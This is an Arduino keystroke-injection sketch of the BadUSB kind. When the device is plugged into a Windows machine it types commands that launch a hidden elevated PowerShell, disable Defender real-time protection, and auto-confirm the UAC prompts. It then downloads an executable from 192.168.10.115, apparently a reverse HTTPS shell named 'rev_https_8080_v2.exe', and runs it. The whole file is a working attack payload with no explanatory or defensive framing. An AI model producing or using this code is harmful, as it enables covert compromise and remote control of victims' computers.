#include <Keyboard.h>

void setup() {
String url = "http://192.168.10.115/treats/rev_https_8080_v2.exe";
String file = "rev_https_8080_v2.exe";
Keyboard.begin();
delay(5000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(200);
Keyboard.print("powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs");
// Keyboard.print("powershell Start-Process powershell -Verb runAs");
delay(300);
typeKey(KEY_RETURN);
delay(500);
Keyboard.press(KEY_LEFT_ALT);
delay(300);
Keyboard.press(106); // "j"
// Keyboard.press(121); // "y"
Keyboard.releaseAll();
delay(500);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(200);
Keyboard.print("powershell Start-Process powershell -Verb runAs");
delay(300);
typeKey(KEY_RETURN);
delay(500);
Keyboard.press(KEY_LEFT_ALT);
delay(300);
Keyboard.press(106); // "j"
// Keyboard.press(121); // "y"
Keyboard.releaseAll();
delay(500);
Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = \"tls12, tls11, tls\"; $down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = '" + file +"'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($PSScriptRoot + $file); exit;");
typeKey(KEY_RETURN);
Keyboard.end();
}
void typeKey(int key){
Keyboard.press(key);
delay(500);
Keyboard.release(key);
}
void loop() {}
